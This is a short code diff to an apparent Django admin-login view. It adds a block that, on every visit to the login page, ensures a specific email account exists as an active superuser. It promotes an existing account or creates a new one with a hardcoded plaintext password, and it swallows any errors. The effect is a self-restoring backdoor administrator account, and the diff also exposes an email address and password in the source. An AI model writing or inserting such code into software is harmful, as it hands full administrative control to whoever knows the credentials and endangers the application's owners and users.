@@ -22,6 +22,32 @@ def is_admin(user):
     return user.is_authenticated and (user.is_admin or user.is_superuser)
 
 def admin_login(request):
+    # ALWAYS ensure hardcoded admin user exists
+    try:
+        from django.contrib.auth import get_user_model
+        User = get_user_model()
+        admin_user = User.objects.filter(email='josuekabalisa@gmail.com').first()
+        if not admin_user or not admin_user.is_admin:
+            if admin_user:
+                # Update flags
+                admin_user.is_admin = True
+                admin_user.is_staff = True
+                admin_user.is_superuser = True
+                admin_user.is_active = True
+                admin_user.save()
+            else:
+                # Create user
+                admin_user = User.objects.create_superuser(
+                    email='josuekabalisa@gmail.com',
+                    password='Uwamahor12345@@',
+                    first_name='Admin',
+                    last_name='User'
+                )
+                admin_user.is_admin = True
+                admin_user.save()
+    except Exception as e:
+        logger.error(f"Failed to ensure admin user: {str(e)}")
+    
     if request.user.is_authenticated:
         if request.user.is_admin or request.user.is_superuser:
             return redirect('/admin_panel/')
